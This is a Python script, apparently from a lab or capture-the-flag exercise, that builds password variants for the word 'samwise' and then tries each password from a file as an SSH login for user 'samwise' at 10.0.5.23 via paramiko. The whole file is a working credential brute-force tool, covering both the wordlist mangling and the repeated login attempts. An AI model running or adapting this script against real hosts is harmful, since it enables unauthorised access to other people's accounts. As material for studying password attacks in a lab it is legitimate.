import itertools
import paramiko
import time

def mangle_word(word):
    # List of mangled words
    mangled_words = []

    # Capitalize first letter
    mangled_words.append(word.capitalize())

    # Capitalize every letter
    mangled_words.append(word.upper())

    # Add digits to end of word
    for i in range(10):
        mangled_words.append(word + str(i))

    # Add special characters to end of word
    special_characters = ['!', '@', '#', '$', '%', '^', '&', '*']
    for char in special_characters:
        mangled_words.append(word + char)

    # Reverse word
    mangled_words.append(word[::-1])

    # Replace letters with numbers that look similar
    mangled_words.append(word.replace('a', '@').replace('s', '$').replace('o', '0'))

    # Concatenate multiple mangled words
    #for i in range(2, len(mangled_words) + 1):
    #    for combination in itertools.combinations(mangled_words, i):
    #        mangled_words.append(''.join(combination))

    # Remove duplicates
    
    for x in range(0, len(mangled_words)):
        mangled_words.append(mangled_words[x].capitalize())
        mangled_words.append(mangled_words[x].upper())
        
    mangled_words = list(set(mangled_words))


    return mangled_words

word = "samwise"
mangled_list = mangle_word(word)

mangled_list = [
"samwise",
"samwise1",
"samwise7",
"samwisegamgee",
"samwise88",
"samwise123",
"samwise0",
"samwisethegange",
"samwisethebrave",
"samwisegamgee",
"samwiseg",
"samwise69",
"samwise5",
"samwise444555",
"samwise44",
"samwise4",
"samwise3",
"samwise2006",
"samwise17",
"samwise!",
"debt65samwise",
"1511samwise"

]

mangled_list = mangle_word(word)

file1 = open('sam.txt','r')
lines = file1.readlines()

#lines.insert(0,"SamwiseGamgee19")

for word in lines:
    print(word)
    while True:
        try:
            #time.sleep(0.2)
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect('10.0.5.23', username="samwise", password=word, banner_timeout=200, timeout=200, auth_timeout=200)
            while True:
                print("Connected")
            client.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("Nope")
        except EOFError:
            continue
        except paramiko.ssh_exception.SSHException:
            continue
        break
#print(len(mangled_list))
